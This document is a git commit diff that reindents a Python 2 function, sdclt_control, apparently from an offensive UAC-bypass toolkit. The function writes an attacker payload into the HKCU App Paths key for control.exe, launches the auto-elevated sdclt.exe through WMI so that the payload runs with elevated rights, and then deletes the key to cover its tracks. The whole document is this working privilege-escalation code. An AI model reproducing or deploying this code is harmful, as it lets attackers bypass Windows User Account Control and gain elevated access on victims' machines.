bfaba172fc2fea06d380e6991f66905c6a136661
rootm0s <rickardmalmkvist@hotmail.com>
2018-05-07 14:59:08 +0200

    Update sdclt_control.py

--- sdclt_control.py
+++ sdclt_control.py
@@ -27,45 +27,45 @@ def warningBox():
 	return (Fore.YELLOW + '[!]' + Fore.RESET)
 
 def sdclt_control():
-		print " {} sdclt_control: Attempting to create registry key".format(infoBox())
-		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-						os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
-									
-			_winreg.SetValueEx(key,
-					None,
-					0,
-					_winreg.REG_SZ,
-					payload)
-			_winreg.CloseKey(key)
-			print " {} sdclt_control: Registry key created".format(successBox())
-		except Exception as error:
-			print " {} sdclt_control: Unable to create key".format(errorBox())
-			return False
-
-		print " {} sdclt_control: Pausing for 5 seconds before executing".format(infoBox())
-		time.sleep(5)
-		
-		print " {} sdclt_control: Attempting to create process".format(infoBox())
-		try:
-			result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start sdclt.exe",
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
-			if (result[1] == 0):
-				print " {} sdclt_control: Process started successfully".format(successBox())
-			else:
-				print " {} sdclt_control: Problem creating process".format(errorBox())
-		except Exception as error:
-			print " {} sdclt_control: Problem creating process".format(errorBox())
-			return True
-
-		print " {} sdclt_control: Pausing for 5 seconds before cleaning".format(infoBox())
-		time.sleep(5)
-		
-		print " {} sdclt_control: Attempting to remove registry key".format(infoBox())
-		try:
-			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
+	print " {} sdclt_control: Attempting to create registry key".format(infoBox())
+	try:
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
 					os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
-			print " {} sdclt_control: Registry key was deleted".format(successBox())
-		except Exception as error:
-			print " {} sdclt_control: Unable to delete key".format(errorBox())
-			return False
+								
+		_winreg.SetValueEx(key,
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
+		_winreg.CloseKey(key)
+		print " {} sdclt_control: Registry key created".format(successBox())
+	except Exception as error:
+		print " {} sdclt_control: Unable to create key".format(errorBox())
+		return False
+		
+	print " {} sdclt_control: Pausing for 5 seconds before executing".format(infoBox())
+	time.sleep(5)
+		
+	print " {} sdclt_control: Attempting to create process".format(infoBox())
+	try:
+		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start sdclt.exe",
+						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+		if (result[1] == 0):
+			print " {} sdclt_control: Process started successfully".format(successBox())
+		else:
+			print " {} sdclt_control: Problem creating process".format(errorBox())
+	except Exception as error:
+		print " {} sdclt_control: Problem creating process".format(errorBox())
+		return True
+
+	print " {} sdclt_control: Pausing for 5 seconds before cleaning".format(infoBox())
+	time.sleep(5)
+	
+	print " {} sdclt_control: Attempting to remove registry key".format(infoBox())
+	try:
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
+				os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
+		print " {} sdclt_control: Registry key was deleted".format(successBox())
+	except Exception as error:
+		print " {} sdclt_control: Unable to delete key".format(errorBox())
+		return False
